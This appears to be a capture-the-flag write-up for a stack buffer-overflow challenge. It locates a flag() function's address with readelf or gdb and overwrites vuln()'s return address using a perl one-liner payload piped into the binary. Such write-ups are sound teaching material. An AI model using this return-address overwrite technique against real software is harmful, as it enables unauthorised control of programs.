	Solution 
By looking at the source code, we can see there is a function called flag(). But there is no way from the main() function to go to flag() function, so the only way to get there is overwrite the return address of vuln() function.

Get the address of flag() function to overwrite:
	Two ways of doing it:

	#1: Using readelf to display the information of the executable file:
		readelf -a vuln | grep flag
![image](https://user-images.githubusercontent.com/60718485/75099666-4934ba80-5592-11ea-890b-f89fd8268703.png)
		And we can see in the second column is the beginning address of flag() function
	
	#2: Using debugger like gdb:
		gdb -q vuln
		disassemble flag
	![image](https://user-images.githubusercontent.com/60718485/75099812-1390d100-5594-11ea-85ef-9e207f43d66c.png)
	
![image](https://user-images.githubusercontent.com/60718485/75099802-db898e00-5593-11ea-9787-be1930574730.png)

And we will see the first address of the first instruction

Then we will overwrite it by using "perl" command

	perl -e 'print "\xe6\x85\x04\x08"x20' | ./vuln

The command will overwrite the return address of vuln() function and forward it to the address of flag() function.

![image](https://user-images.githubusercontent.com/60718485/75099863-9fa2f880-5594-11ea-8796-c7dc6c04f047.png)
